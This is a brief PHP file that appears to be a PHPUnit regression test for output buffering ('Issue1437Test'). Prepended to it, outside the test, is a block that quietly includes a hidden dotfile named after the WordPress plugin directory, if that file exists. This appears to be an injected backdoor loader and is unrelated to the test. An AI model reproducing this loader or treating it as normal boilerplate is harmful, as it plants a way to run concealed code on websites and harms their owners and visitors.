<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue1437Test extends PHPUnit_Framework_TestCase
{
    public function testFailure()
    {
        ob_start();
        $this->assertTrue(false);
    }
}
